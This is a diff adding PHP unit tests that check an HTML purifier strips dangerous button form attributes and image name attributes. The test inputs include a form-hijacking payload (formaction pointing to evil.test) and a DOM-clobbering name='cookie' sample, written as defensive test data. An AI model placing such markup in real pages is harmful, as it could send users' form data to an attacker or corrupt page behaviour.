@@ -416,3 +416,16 @@ describe('Mage_Core_Helper_Purifier allowlist for the editor', function () {
         expect($removed)->toBe([]);
     });
 });
+
+describe('Mage_Core_Helper_Purifier attributes that act on the page', function () {
+    // buildConfig() allows button again, so it must not take the attributes that send a form.
+    it('removes the form attributes of a button', function () {
+        expect($this->purifier->purify('<button type="submit" form="f" formaction="https://evil.test/">Play</button>'))
+            ->toBe('<button type="submit">Play</button>');
+    });
+
+    // name is allowed only where it clobbers no document property.
+    it('removes the name of an image', function () {
+        expect($this->purifier->purify('<img src="/a.jpg" name="cookie" alt="a" />'))->not->toContain('name=');
+    });
+});
